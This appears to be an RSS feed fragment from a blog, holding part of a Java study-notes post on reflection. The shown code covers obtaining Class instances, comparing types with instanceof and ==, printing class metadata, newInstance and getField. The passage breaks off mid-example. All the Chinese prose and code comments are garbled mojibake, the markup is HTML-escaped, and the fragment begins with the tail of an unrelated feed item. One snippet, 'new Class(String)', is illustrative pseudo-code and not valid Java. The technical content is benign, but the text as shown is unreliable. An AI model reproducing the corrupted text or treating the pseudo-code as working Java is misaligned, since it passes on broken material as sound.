&lt;p>â€”â€”â€”â€”ç”±äºæœ€è¿‘ä¹Ÿå­¦ä¹ äº†CL&amp;amp;TEå¤´çš„ç›¸å…³å†…å®¹ï¼Œå†çœ‹åˆ°è¿™é‡Œçš„å®ç°ç»†èŠ‚æ„Ÿè§‰è¿˜æŒºäº²åˆ‡çš„ï¼ˆè¯´æ˜è‡ªå·±å­¦çš„å®åœ¨å¤ªå°‘äº†ï¼ˆ&lt;/p>
&lt;hr>
&lt;p>æ˜¯å­¦ä¹ ç¬”è®°ï¼Œæœ‰å¾ˆå¤šç–æ¼è¿˜è¯·è°…è§£ï¼ˆ&lt;/p>
&lt;p>ä¸€ç›´ä¸å¼€å­¦ï¼Œåœ¨å®¶å‡ ä¸ªæœˆå¤šå°‘æœ‰ç‚¹æ‡ˆæ€ ï¼Œä½†æ˜¯æ—¶é—´ä¸ç­‰äººå•Šï¼Œä¸è¦è’åºŸäº†è‡ªå·±&lt;/p></description></item><item><title>Javaå­¦ä¹ ç¬”è®°â…¡</title><link>https://amiaaaz.github.io/2022/02/28/java-study-notes-02/</link><pubDate>Mon, 28 Feb 2022 02:40:55 +0800</pubDate><guid>https://amiaaaz.github.io/2022/02/28/java-study-notes-02/</guid><description>&lt;p>å¹¶éJavaå¼€å‘è¦æŒæ¡çš„å…¨éƒ¨è¯­æ³•ï¼Œæˆ‘æŒ‘ç€æ¥çš„ï¼ˆæå‰å£°æ˜&lt;/p>
&lt;hr>
&lt;p>è¿˜æ˜¯å»–å¤§çš„Javaæ•™ç¨‹ï¼Œåé¢çš„å®‰å…¨éƒ¨åˆ†æ¥è‡ªpç‰›çš„Javaå®‰å…¨æ¼«è°ˆ&lt;/p>
&lt;h2 id="åå°„">åå°„&lt;/h2>
&lt;p>åå°„Reflectionå¯ä»¥åœ¨ç¨‹åºè¿è¡ŒæœŸï¼Œå¯¹æŸä¸ªå®ä¾‹ä¸€æ— æ‰€çŸ¥çš„æƒ…å†µä¸‹ æ‹¿åˆ°ä¸€ä¸ªå¯¹è±¡çš„æ‰€æœ‰ä¿¡æ¯ï¼Œè°ƒç”¨å…¶æ–¹æ³•&lt;/p>
&lt;p>æ˜¯ååˆ†å¼ºå¤§çš„è¯­è¨€æ­¦å™¨&lt;/p>
&lt;h3 id="classåŠ¨æ€åŠ è½½">Class&amp;amp;åŠ¨æ€åŠ è½½&lt;/h3>
&lt;ul>
&lt;li>&lt;code>class&lt;/code>ç”±JVMåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­åŠ¨æ€åŠ è½½ï¼ŒJVMç¬¬ä¸€æ¬¡è¯»å–åˆ°ä¸€ç§&lt;code>class&lt;/code>ç±»å‹æ—¶ å°†å…¶åŠ è½½å…¥å†…å­˜ï¼ˆä¸é‡åˆ°ä¸ä¼šé¢„å…ˆåŠ è½½ï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹å¯ä»¥åšåˆ°è¿è¡ŒæœŸæ ¹æ®æ¡ä»¶åŠ è½½ä¸åŒçš„å®ç°ç±»ï¼‰ï¼Œæ¯åŠ è½½ä¸€ç§&lt;code>class&lt;/code>ï¼ŒJVMå°±ä¸ºå…¶åˆ›å»ºä¸€ä¸ª&lt;code>Class&lt;/code>ç±»å‹çš„å®ä¾‹ å¹¶ä¸å…¶å…³è”èµ·æ¥&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// classç±»å‹: åå«Classçš„class
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Class&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#75af00">Class&lt;/span>&lt;span style="color:#f92672">(){}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä»¥&lt;code>String&lt;/code>ç±»ä¸ºä¾‹ï¼Œå½“JVMåŠ è½½&lt;code>String&lt;/code>ç±»æ—¶ï¼Œå®ƒé¦–å…ˆè¯»å–&lt;code>String.class&lt;/code>å…¥å†…å­˜ï¼Œç„¶åä¸º&lt;code>String&lt;/code>ç±»åˆ›å»ºä¸€ä¸ª&lt;code>Class&lt;/code>å®ä¾‹å¹¶å…³è”èµ·æ¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ª&lt;code>Class&lt;/code>å®ä¾‹çš„æ„é€ æ–¹æ³•ä¸º&lt;code>private&lt;/code>ï¼Œåªæœ‰JVMå¯ä»¥åˆ›å»º&lt;/p>
&lt;ul>
&lt;li>JVMæŒæœ‰çš„æ¯ä¸ª&lt;code>Class&lt;/code>å®ä¾‹éƒ½æŒ‡å‘ä¸€ä¸ªæ•°æ®ç±»å‹(class or interface)&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220227104610572.png" alt="image-20220227104610572">&lt;/p>
&lt;ul>
&lt;li>ä¸€ä¸ª&lt;code>Class&lt;/code>å®ä¾‹åŒ…å«äº†è¯¥&lt;code>class&lt;/code>çš„æ‰€æœ‰ä¿¡æ¯ï¼Œæ‰€ä»¥å¦‚æœè·å–äº†æŸä¸ª&lt;code>Class&lt;/code>å®ä¾‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ª&lt;code>Class&lt;/code>å®ä¾‹è·å–åˆ°è¯¥å®ä¾‹å¯¹åº”çš„&lt;code>class&lt;/code>çš„æ‰€æœ‰ä¿¡æ¯ï¼Œè¿™å°±å«åå°„Reflection&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220227104646646.png" alt="image-20220227104646646">&lt;/p>
&lt;ul>
&lt;li>è·å–ä¸€ä¸ª&lt;code>class&lt;/code>çš„&lt;code>Class&lt;/code>å®ä¾‹çš„ä¸‰ç§æ–¹æ³•&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// é€šè¿‡ä¸€ä¸ªclassçš„é™æ€å˜é‡classè·å–
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å·²ç»åŠ è½½æŸä¸ªç±» è·å–å®ƒçš„java.lang.Classå¯¹è±¡
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// é€šè¿‡å®ä¾‹å˜é‡çš„getClassæ–¹æ³•è·å–
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ä¸Šä¸‹æ–‡å·²å­˜åœ¨æŸä¸ªç±»çš„å®ä¾‹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// é€šè¿‡é™æ€æ–¹æ³•Class.forNameè·å–
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å‰ææ˜¯çŸ¥é“classçš„å®Œæ•´ç±»å
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.String&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å› ä¸º&lt;code>Class&lt;/code>å®ä¾‹åœ¨JVMä¸­æ˜¯å”¯ä¸€çš„ï¼Œæ‰€ä»¥ä¸Šè¿°æ–¹æ³•è·å–çš„&lt;code>Class&lt;/code>å®ä¾‹æ˜¯åŒä¸€ä¸ªå®ä¾‹ï¼Œå¯ä»¥ç”¨&lt;code>==&lt;/code>æ¯”è¾ƒ&lt;/li>
&lt;li>ä¸€èˆ¬åº”è¯¥ç”¨&lt;code>instanceof&lt;/code>åˆ¤æ–­æ•°æ®ç±»å‹ï¼Œä¸ä½†åŒ¹é…æŒ‡å®šç±»å‹ï¼Œè¿˜åŒ¹é…æŒ‡å®šç±»å‹çš„å­ç±»ï¼›è€Œç”¨&lt;code>==&lt;/code>åˆ¤æ–­&lt;code>class&lt;/code>å®ä¾‹å¯ä»¥ç²¾ç¡®åœ°åˆ¤æ–­æ•°æ®ç±»å‹ï¼Œä½†ä¸èƒ½ä½œå­ç±»å‹æ¯”è¾ƒ&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">123&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">b1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// trueï¼Œå› ä¸ºnæ˜¯Integerç±»å‹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">b2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// trueï¼Œå› ä¸ºnæ˜¯Numberç±»å‹çš„å­ç±»
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">b3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// trueï¼Œå› ä¸ºn.getClass()è¿”å›Integer.class
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">b4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// falseï¼Œå› ä¸ºInteger.class!=Number.class
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>é€šè¿‡åå°„è·å–å®ä¾‹çš„åŸºæœ¬ä¿¡æ¯çš„å°æ —å­&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// æ³¨
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runnable&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Month&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Class name: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Simple name: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSimpleName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getPackage&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Package name: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getPackage&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;is interface: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isInterface&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;is enum: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isEnum&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;is array: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isArray&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;is primitive: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isPrimitive&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>&lt;code>String[]&lt;/code>ä¹Ÿæ˜¯ä¸€ç§ç±»ï¼Œä¸åŒäº&lt;code>String.class&lt;/code>ï¼Œå®ƒçš„ç±»åæ˜¯&lt;code>[Ljava.lang.String;&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ¯ä¸€ç§åŸºæœ¬ç±»å‹å¯¹åº”çš„&lt;code>Class&lt;/code>å®ä¾‹å¯ä»¥ç”¨&lt;code>åŸºæœ¬ç±»å‹.class&lt;/code>è®¿é—®&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è·å–åˆ°&lt;code>Class&lt;/code>å®ä¾‹åå¯ä»¥ç”¨å®ƒæ¥åˆ›å»ºå¯¹åº”ç±»å‹çš„å®ä¾‹ï¼Œä¸ç›´æ¥newçš„ç›¸æ¯”ï¼Œå±€é™åœ¨äºåªèƒ½è°ƒç”¨&lt;code>public&lt;/code>çš„æ— å‚æ•°æ„é€ æ–¹æ³•ï¼Œè€Œæœ‰å‚æ•°çš„æ„é€ æ–¹æ³• æˆ–é&lt;code>public&lt;/code>çš„æ„é€ æ–¹æ³•éƒ½æ— æ³•é€šè¿‡&lt;code>Class.newInstance()&lt;/code>è°ƒç”¨&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ç›¸å½“äº new String()
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="è®¿é—®å­—æ®µ">è®¿é—®å­—æ®µ&lt;/h3>
&lt;ul>
&lt;li>&lt;code>Class&lt;/code>ç±»æä¾›äº†ä»¥ä¸‹å‡ ä¸ªæ–¹æ³•æ¥è·å–å­—æ®µçš„ï¼ˆè¿”å›&lt;code>Field&lt;/code>å¯¹è±¡&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">stdClass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// æ ¹æ®å­—æ®µåè·å–æŸä¸ªpublicçš„field(åŒ…æ‹¬çˆ¶ç±»)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;score&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// è·å–publicå­—æ®µ&amp;#34;score&amp;#34;
